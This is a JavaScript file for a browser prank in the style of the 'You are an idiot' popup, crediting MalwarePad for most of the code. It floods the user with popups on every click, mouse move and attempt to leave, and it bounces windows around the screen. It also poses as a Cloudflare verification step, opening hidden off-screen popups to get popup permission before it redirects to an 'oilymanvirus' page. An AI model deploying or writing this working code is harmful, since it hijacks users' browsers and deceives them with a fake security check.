/*
Huge thanks to MalwarePad (https://malwarepad.com) for the majority of the code!
*/

if (top.location != location) {
  top.location.href = location.href;
}

function reopen() {
  window.open(
    "popup.html",
    "",
    "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
  );
}
function spam() {
  for (var i = 0; i < 10; i++) {
    reopen();
  }
  return "You are an idiot!";
}
function init() {
  document.body.onclick = reopen;
  document.body.onmouseover = reopen;
  document.body.onmousemove = reopen;
  window.onunload = spam;
  window.onbeforeunload = spam;
  playBall();
  if (bookmark) {
    bookmark();
  }
  reopen();
  setTimeout(function () {
    window.close();
  }, 10000);
}
var xOff = 5,
  yOff = 5,
  xPos = 400,
  yPos = -100,
  flagRun = true;
function newXlt() {
  xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
  window.focus();
}
function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function newYup() {
  yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
}
function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function fOff() {
  flagrun = false;
}
function playBall() {
  xPos += xOff;
  yPos += yOff;
  if (xPos > screen.width - 175) {
    newXlt();
  }
  if (xPos < 0) {
    newXrt();
  }
  if (yPos > screen.height - 100) {
    newYup();
  }
  if (yPos < 0) {
    newYdn();
  }
  if (flagRun) {
    window.moveTo(xPos, yPos);
    setTimeout(playBall, 1);
  }
}

function permprompt() {
  const attempts = 3;
  const popups = [];

  // Attempt to open multiple popups
  for (let i = 0; i < attempts; i++) {
      const popup = window.open("https://cloudflare.com/popuptest?=hD3UMay0orTnzvfYQPBeoobhnvucEztt63gahzvqy968xPSs9qxigpdT8u52Omt0nuvtDL1LY3jrrIkxb8BBHJMaFGQrOMcR7iK8wZFLbcIXK2jUfUXCU61Ow11fFMFv", "", "width=1,height=1,left=-1000,top=-1000");
      popups.push(popup);
  }

  // Check if popups were blocked
  const blocked = popups.some(popup => popup === null || typeof popup === "undefined");

  if (blocked) {
      popups.forEach(popup => {
          if (popup && !popup.closed) popup.close();
      });
      
      setTimeout(function () {
          const changeElement = document.getElementById("change");
          if (changeElement) {
              changeElement.textContent = "Verifying...";
          }
      }, 300);
      

      setTimeout(function () {
          const changeElement = document.getElementById("change");
          if (changeElement) {
              changeElement.textContent = "Enable popups to continue.";
          }
      }, 2000);
  } else {
      console.log("Popups allowed");
      popups.forEach(popup => popup.close());
      window.location.href = "https://hrishiky.github.io/oilymanvirus.html";
  }
}

// Ensure the DOM is fully loaded before calling the function
document.addEventListener('DOMContentLoaded', () => {
  const button = document.querySelector('.turnstile-button');
  if (button) {
      button.addEventListener('click', permprompt);
  }
});



